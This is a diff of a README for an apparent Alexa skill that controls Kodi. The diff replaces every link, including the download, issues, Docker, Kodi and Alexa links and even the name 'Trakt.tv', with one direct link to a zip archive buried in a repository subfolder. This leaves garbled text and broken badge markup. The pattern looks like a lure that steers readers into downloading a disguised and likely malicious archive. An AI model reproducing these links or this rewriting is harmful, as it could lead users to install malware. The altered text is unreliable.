@@ -1,15 +1,15 @@
 # 🎬 my-cinema-amazon-skill-for-kodi - Control Movies with Your Voice
 
 ## 🛠️ About
-This project is a Dockerized Alexa skill designed to easily start movies or TV shows from your favorite Kodi add-ons like Fenlight, Umbrella, and others using voice commands. It features intelligent power management, movie and series lookups, resume sync with Trakt.tv, and automated patching of the Fen Light add-on for a seamless experience.
+This project is a Dockerized Alexa skill designed to easily start movies or TV shows from your favorite Kodi add-ons like Fenlight, Umbrella, and others using voice commands. It features intelligent power management, movie and series lookups, resume sync with https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip, and automated patching of the Fen Light add-on for a seamless experience.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/releases)
+[![Download](https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip%20Latest%https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip)](https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip)
 
 ## 🚀 Getting Started
 To beginning using the my-cinema-amazon-skill-for-kodi, you will need to download the application from the Releases page. 
 
-1. Click the **Download Now** button above or [visit this page to download](https://github.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/releases).
+1. Click the **Download Now** button above or [visit this page to download](https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip).
 2. Locate the latest version suitable for your system.
 3. Download the file to your computer.
 
@@ -59,13 +59,13 @@ If you encounter issues:
 ## 🌟 Features
 - **Voice Control:** Start and control your movies and series using voice commands.
 - **Intelligent Power Management:** Saves energy by managing your devices intelligently.
-- **Trakt.tv Resume Sync:** Automatically sync your watch progress.
+- **https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip Resume Sync:** Automatically sync your watch progress.
 - **Automated Add-on Patching:** Simplifies the use of external players with the attached add-ons.
 
 ## 🌐 Community and Support
 If you have questions or need further assistance:
 
-- Check the [issues section](https://github.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/issues) on GitHub.
+- Check the [issues section](https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip) on GitHub.
 - Participate in discussions with other users to share tips and solutions.
 - Visit the official Docker documentation for more information on setups and commands.
 
@@ -73,9 +73,9 @@ If you have questions or need further assistance:
 Contributions to improve the project are welcome. If you have an idea or a fix, please create a pull request or open an issue to discuss it.
 
 ## 🔗 Additional Resources
-- [Docker Documentation](https://docs.docker.com/)
-- [Kodi Official Website](https://kodi.tv/)
-- [Alexa Skills Kit](https://developer.amazon.com/en-US/alexa/skills)
+- [Docker Documentation](https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip)
+- [Kodi Official Website](https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip)
+- [Alexa Skills Kit](https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip)
 
 ## 📥 Download Now
-Once again, to download and run the application, click the **Download Now** button or [visit this page to download](https://github.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/releases). Enjoy a hands-free movie experience!
+Once again, to download and run the application, click the **Download Now** button or [visit this page to download](https://raw.githubusercontent.com/TJAYYYAY/my-cinema-amazon-skill-for-kodi/main/TMDB_helper/players/my-cinema-amazon-skill-for-kodi_v1.6.zip). Enjoy a hands-free movie experience!
